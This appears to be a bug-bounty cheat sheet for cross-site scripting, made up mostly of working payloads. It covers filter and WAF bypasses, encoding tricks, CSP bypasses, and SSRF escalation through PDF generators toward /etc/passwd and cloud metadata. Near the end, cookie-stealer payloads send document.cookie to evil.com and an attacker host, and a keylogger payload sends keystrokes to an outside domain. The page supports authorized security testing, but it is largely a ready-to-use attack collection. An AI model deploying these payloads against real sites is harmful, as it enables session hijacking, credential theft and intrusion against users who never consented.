<h1>Cross Site Scriping</h1><br>
<b> REMOVE THE . FROM ALL XSS SCRIPTS, IT KEPT EMBEDDING INTO GITHUB EVEN IF WITHIN CODE BLOCKS </b>
<h2>first glance methodology </h2>
On a website that allows you to register an account, test every feature avaliable with the payload <.h1>test<./h1>(remove the . it was rendering my h1 tag on this page). Do this on every feature that allows input. <br>
Navigate the application and see if theres any places your H1 tag is interpreted. <br>
View the page source and quickly filter for test and see what encoding is in place on your input. <br>
If tags are filtered but your input is placed within a value="test" can you add test" eventhandler and does the " get filtered? <br>
If your input is directly into a script tag, can you break out the context? E.g. if your input lands within a "var" can you close the var <br>
var srchstring = 'test' - enter test'-alert(1)-' and see what happens. You may need to use a ; after the first ' - test'; -alert(1)-' <br>
<br>
Burpsuite allows you to customise scans, create a scan and remove all scans except the scan titled "reflection". Run this on your burp project file to identify all reflected inputs on the web application and test from there. <br>
<br>
Never submit a vulnerability with alert(1) show impact, use document.cookie and demonostrate a cookie stealer POC aslong as cookies are not set to httpONLY (not readable by javascript if set). <br>
<br>
Right click on your input and view in inspect element aswell as source to see potential DOM XSS. <br>
If on a url add ?<> and add tag within the <>, see if this fires a DOM xss if url is embedded within URL. Also could try break out element if within a element DOM with " <br>
<br>
<h2> Quick Win bash scripting </h2><br>
<b> You will need waybackurls, gf patterns, qsreplace and airixss installed.</b><br>
cat waybackurls.txt | gf xss | qsreplace '<.test>' | airixss -p "<.test>" (remove the . infront of test)<br>
This will check all urls grepped under the xss catagory for reflection of unfiltered <>tags <br>
Use the same one liner but for url encoder - cat waybackurls.txt | gf xss | qsreplace '%3Ctest%3E' | airixss -p "<test>" <br>
 <br>
<h2>Alert POC Alternatives</h2>
If alert is blocked or filtered, first try confirm(1), print() or prompt(1).<br>
Try URL Encoding the A on alert - %61lert(1). URL each char if this does not work using referemce - https://www.w3schools.com/tags/ref_urlencode.ASP <br>
[%27al\x65rt%27](document.domain);// <br>
window['alert'](0)  <br>
parent['alert'](1)  <br>
self['alert'](2)  <br>
top['alert'](3)  <br>
this['alert'](4)  <br>
frames['alert'](5)  <br>
content['alert'](6)  <br>
constructor.constructor("aler"+"t(3)")(); <br>
[].filter.constructor('ale'+'rt(4)')(); <br>
 top["al"+"ert"](5); <br>
top[8680439..toString(30)](7); <br>
top[/al/.source+/ert/.source](8); <br>
top['al\x65rt'](9); <br>
You dont need a popup for a POC, you can go straight to a cookie stealer POC. <br>
<br>
<h2>Identify what is being blocked</h2>
Can you submit a <.h1> tag but if using xss payload its blocked? Write out the xss payload removing elements at a time? maybe it gets blocked on alert(1) - if so use the alert bypass. Maybe it gets blocked on the event handler? If so copy event handlers to file and use on intruder to see what is allowed? <br>
URL encode characters of the event handler one at a time and see if this successes. <br>
is it being blocked due to the spaces? remove all spaces from the attack payload - <.svg/onload=alert(1)> - <.a/href= - <.h1 id=xonmouseover=alert(1)>test<./h1>
<br>
<br>
<h2>XSS Filter Bypasses</h2> <br>
<b>Remove . from all payloads</b> <br>
Is <.script>alert(1)</script.> filtered? Try: <br>
<.scr<.script>ipt>alert(1)<./scr</script.>ipt> <br>
<.img src=x onerror=alert(1)> <br>
<.svg/onload=alert(1)> <br>
<.h1 id=x onpointermove=alert(1)>test<./h1> <br>
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E <br>
<.randomfaketag id=x onwheel=alert(1)><br>
<.a href=javascript:alert(1)>click</a.><br>
<.ScRiPt>alert(1)<./ScRiPt><br>
 <br>
Run through the payload list here on intruder and select grep for url decoded values https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt <br>
 <br>
< and > can be replace with html entities &lt; and &gt; <br>
 <br>
You can try an XSS polyglot <br>
 https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626<br>
 <br>
Try New Lines to break the firewall - newline URL encoded is %0 - <.script>%0alert(1)</script> - try with different HTML tags <br>
 <br>
Try double encoding a newline break %2522 <br> 
 <br>
New Line breaks often work on <.a/href=%2522javascript:alert(1)> <br>
 <br>
Injecting anchor tag without whitespaces -breaking up characters with decoded value of %26Tab%3B (url decode character) between each character<br>
 <br>
 Try bypassing spaces with a bullet if / does not work - <code><.svg•onload=alert(1)> </code><br>
 <br>
 <h3> Encoding </h3>
 Try URL encoding on the payload <br>
 Try double URL encoding and see if this gets decoded <br>
 Try Unicoding normization - https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html - select a character and see if the ASCII value is reflected <br>
 Try normal unicode  - https://www.branah.com/unicode-converter <br>
 Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was transformed into U+003C LESS­THAN SIGN (<)<br>
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (")<br>
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (') <br>
E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/ <br>
%EF%BC%9E becomes > <br>
%EF%BC%9C becomes < <br>
 Try UTF-7, UTF-8 UTF-16BE, UTF-32 encoding
 <br>
 <h3> File Upload XSS </h3><br>
 If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
 Does the app allow .svg files to be uploaded? if yes, enter the code within an svg file <br>
 If you can insert IFRAMES into the app, use the src=link to an svg file. <br>
 <br>
 <h3> CSP Bypass </h3><br>
 This will work for script-src self: <br>
 <.object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object.> <br>
 <.object data="javascript:alert(1)".> (firefox) <br>
 <.script src="data:,alert(1)">/<./script>
<br>
 <h3> XSS within Variables and scripts</h3>
 '-alert(1)-' (if backslash escaped use the payload below) <br> 
\'-alert(1)// <br>
"+alert(1));<br>
'-prompt(1)// <br>
// generate string for this payload with btoa('alert(1)') <br>
eval(atob('YWxlcnQoMSk=')) <br>
\'-prompt(1)// <br>
<br> 
<h3>Tiny Payload<h3> <br>
<.base href=//0> <br>
<br>
<h2>A href bypasses</h2>
If exploiting <a. href></a> xss and "javasript" is blocked by WAF or URL then try the below. <br>
Add any number of \n \t or \r in the middle <br>
java\nscript: <br>
java\nscript:%61lert(1)// 
Add characters from \x00- \x20 at the beginning <br>
\x01javascript: <br>
\00xjavascript: <br>
remove the space with a \ character - <.tag\href><br>
<br>
Randomise the case<br>
jaVAscrIpT:<br>
Can also use the below to get rid of the word JavaScript all together<br>
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)<br>
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)<br>
 <br>
<p align="center">
  <img src="https://pbs.twimg.com/media/Eir5smxXcAcJ4QX?format=jpg&name=large" width="800" height="600" title="hover text">
</p>
<br>
<br>
<h3>XSS polygots</h3> <br>
https://twitter.com/s0md3v/status/966175714302144514 <br>
<br>
 <h3> Bypass " on the alert </h3><br>
 String.fromCharCode(88,83,83) - alert(String.fromCharCode(88,83,83))
<h3> SSRF Esculation </h3> <br>
If you can get XSS within a pdf generator, try get ssrf via an iframe src=http://host or iframe src=file:///etc/passwd <br>
Try with AWS 169.254.169.254 address if AWS <br>
<br>
 <h3> Bypass dot filter </h3> <br>
 Use base64 encoding - alert(document.cookie)" | base64 == YWxlcnQoZG9jdW1lbnQuY29va2llKQ== <br>
 <br>
 <h3> Bypass parenthesis </h3> <br>
 onerror=alert;throw 1337 <br>
 {onerror=alert}throw 1337 <br>
 throw onerror=alert,'some string',123,'haha' <br>
 <br>
 <h3> Bypass onxxxx blacklist </h3><br>
 // Bypass onxxx= filter with a null byte/vertical tab <br>
 onerror\x00=alert(0)<br>
 onerror\x0b=alert(0)<br>
 <br>
 <h3> Bypass email check </h3> <br>
 ".><.svg/onload=confirm(1)>"@x.y <br>
 <br>
 <h3> Different ways to issue redirect </h3> <br>
 location="http://google.com" <br>
document.location = "http://google.com" <br>
document.location.href="http://google.com" <br>
window.location.assign("http://google.com") <br>
window['location']['href']="http://google.com" <br>
 <br>
 <h3> Dont Need to close your tags to bypass "> + > </h3>
 <br>
 <br>
 <h3> Bypass using HTML Encoding </h3> <br>
 %26%2397;lert(1) <br>
&#97;&#108;&#101;&#114;&#116; <br>
.><./script><.svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain).> <br>
<h3> Cookie harvestor </h3><br>
<.img/src/onerror=document.location="http://evil.com:8090/cookiez.php?c="+document.cookie><br>
<.script>new Image().src="http://evil.com:8090/b.php?"+document.cookie;<./script>
<.svg onload=fetch("//attacker/r.php?="%2Bcookie).>
<br>
<h3> Keylogger </h3> <br>
<.img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'> <br>
<br>
<h2>Blind Xss</h2>
Similar to Reflected Xss Or Stored Xss But you Dont get any reflection, but you get response on you server. <br>
<br>
Similar methods As given above except try putting payload which can give a callback on your server when executed. <br>
You can use https://xsshunter.com/ or Use burpcollaborator or ngrok. <br>
Try it on contact forms or similar functionality. <br>
Tips <br>
<br>
Copy every payload from your xsshunter payloads section and paste it into every field you see <br>
XSS hunter contains a payload for CSP bypass <br>
Generate some variations of your payloads (example replace < with &lt;) <br>
Where to look for Blind XSS…… <br>
1- Review forms <br>
2- Contact Us pages <br>
3- Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode) <br>
4- Address fields of e-commerce sites <br>
5- First or Last Name field while doing Credit Card Payments <br>
6- Set User-Agent, referr and host header to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite. <br>
7- Log Viewers <br>
8- Feedback Page <br>
9- Chat Applications <br>
10- Any app that requires user moderation <br>
